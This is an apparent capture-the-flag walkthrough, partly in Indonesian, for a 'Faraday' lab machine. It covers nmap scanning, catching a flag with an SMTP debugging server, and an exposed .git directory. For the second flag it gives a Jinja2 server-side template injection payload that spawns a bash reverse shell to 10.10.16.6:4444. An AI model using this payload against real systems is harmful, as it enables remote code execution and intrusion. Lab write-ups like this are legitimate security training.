```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $nmap -sV -sC 10.13.37.14 -Pn 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 17:08 WIB
Nmap scan report for 10.13.37.14
Host is up (0.89s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:05:53:ae:b1:8d:7e:90:f1:ea:81:6b:18:f6:5a:68 (RSA)
|   256 2e:7f:96:ec:c9:35:df:0a:cb:63:73:26:7c:15:9d:f5 (ECDSA)
|_  256 2f:ab:d4:f5:48:45:10:d2:3c:4e:55:ce:82:9e:22:3a (ED25519)
80/tcp   open  http            nginx 1.13.12
| http-git: 
|   10.13.37.14:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add app logic & requirements.txt 
| http-title: Notifications
|_Requested resource was http://10.13.37.14/login?next=%2F
|_http-server-header: nginx/1.13.12
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, LSCP, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to FaradaySEC stats!!!
|     Username: Bad chars detected!
|   NULL: 
|     Welcome to FaradaySEC stats!!!
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=8/6%Time=66B1F6B4%P=x86_64-pc-linux-gnu%r(
SF:NULL,29,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20")%r(Get
SF:Request,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x
SF:20chars\x20detected!")%r(HTTPOptions,3C,"Welcome\x20to\x20FaradaySEC\x2
SF:0stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(FourOhFourRequest
SF:,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars
SF:\x20detected!")%r(JavaRMI,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\n
SF:Username:\x20Bad\x20chars\x20detected!")%r(LSCP,3C,"Welcome\x20to\x20Fa
SF:radaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Generi
SF:cLines,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x2
SF:0chars\x20detected!")%r(RTSPRequest,3C,"Welcome\x20to\x20FaradaySEC\x20
SF:stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(RPCCheck,3C,"Welco
SF:me\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detect
SF:ed!")%r(DNSVersionBindReqTCP,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!
SF:!\nUsername:\x20Bad\x20chars\x20detected!")%r(DNSStatusRequestTCP,3C,"W
SF:elcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20de
SF:tected!")%r(Help,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:
SF:\x20Bad\x20chars\x20detected!")%r(SSLSessionReq,3C,"Welcome\x20to\x20Fa
SF:radaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Termin
SF:alServerCookie,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x
SF:20Bad\x20chars\x20detected!")%r(TLSSessionReq,3C,"Welcome\x20to\x20Fara
SF:daySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Kerberos
SF:,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars
SF:\x20detected!")%r(SMBProgNeg,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!
SF:!\nUsername:\x20Bad\x20chars\x20detected!")%r(X11Probe,3C,"Welcome\x20t
SF:o\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r
SF:(LPDString,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Ba
SF:d\x20chars\x20detected!")%r(LDAPSearchReq,3C,"Welcome\x20to\x20FaradayS
SF:EC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(LDAPBindReq,
SF:3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\
SF:x20detected!");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.52 seconds
```


Flag pertama :

```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $sudo python3 -m smtpd -c DebuggingServer -n 10.10.16.6:25 
/usr/lib/python3.11/smtpd.py:96: DeprecationWarning: The asyncore module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asyncore
/usr/lib/python3.11/smtpd.py:97: DeprecationWarning: The asynchat module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asynchat

---------- MESSAGE FOLLOWS ----------
b'Subject: '
b'X-Peer: 10.13.37.14'
b''
b'An event was reported at JohnConnor:'
b''
b'Here is your gift FARADAY{ehlo_@nd_w3lcom3!}'
------------ END MESSAGE ------------

```

saya menemukan bahwa ada file .git di url nya cek nmap port 80

flag 2: 

payload:

refrensi: https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6

```python
{%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.6/4444+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}
```

flag 3:

di sini kita lihat di file app.py ada import file
```python
from werkzeug.security import generate_password_hash, check_password_hash
```

maka saya akan coba buat crack
